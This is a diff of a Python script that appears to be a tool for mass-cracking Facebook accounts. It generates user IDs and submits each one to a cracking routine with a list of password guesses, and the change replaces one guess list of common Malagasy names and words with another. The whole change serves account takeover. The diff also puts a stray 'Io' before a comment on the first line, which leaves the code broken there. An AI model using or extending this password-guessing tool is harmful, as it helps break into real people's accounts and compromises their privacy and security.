@@ -1,4 +1,4 @@
-# Définir le numéro de version
+Io# Définir le numéro de version
 version_actuelle = "2.0"
 
 
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'chantal','Chantal','mialitsoa','Mialintsoa','tsilavina','Tsilavina','Fitia','fitia','Koloina','koloina','randria','Randria','mamy','Mamy','sariaka','Sariaka','fanomezantsoa','Fanomezantsoa','rakotomalala','Rakotomalala','vanessa','Vanessa','Rondroa','rojo','Mbolatiana','mbolatiana','rakoto','Rakoto','diadema','Diadema','diadema','neny','Neny','Dada','dada','Dera','dera','Mino','mino','Verovero','Trano','trano','rajoelina','Rajoelina','mario','Mario','Tiana','Tiana','rindra','Rindra','sarobidy','Sarobidy','Johane','johane','Tsanta','tsanta','Ceasar','ceasar','Feno','feno','nathanael','Natanael','Jemima','jemima','Brenda','brenda','mimi','Mimi','Madagasikara','madagasikara','Nambinina','Nambinina','Felana','felana','Harena','sitraka','Sitraka','safidy','Safidy','ravakiniaina','Ravakiniaina','Miangoty','miangoty','Clara','clara','Rianah','rianah','Henika','henika','Jessica']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'Mamako','mamako','Mama','mama','tsilavina','Tsilavina','facebook','Facebook','Koloina','koloina','randria','Randria','mamisoa','Mamisoa','Aina','aina','malagasy','Malagasy','rakotomalala','Rakotomalala','bébé','Bébé','Rondro','rojo','Mbola','mbola','rakoto','Rakoto','diadema','Diadema','diadema','neny','Neny','Dada','dada','Dera','dera','Mino','mino','Verovero','Trano','trano','Fifyh','Rajoelina','mario','Mario','Tiana','Tiana','rindra','Rindra','sarobidy','Sarobidy','Johane','johane','Tsanta','tsanta','Ceasar','ceasar','Feno','feno','nathanael','Natanael','Jemima','jemima','Brenda','brenda','mimi','Mimi','Madagasikara','madagasikara','Nambinina','Nambinina','Felana','felana','Harena','sitraka','Sitraka','safidy','Safidy','ravakiniaina','Ravakiniaina','Miangoty','miangoty','Natacha','natacha','Riana','riana','saholy','Saholy','Jessica']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
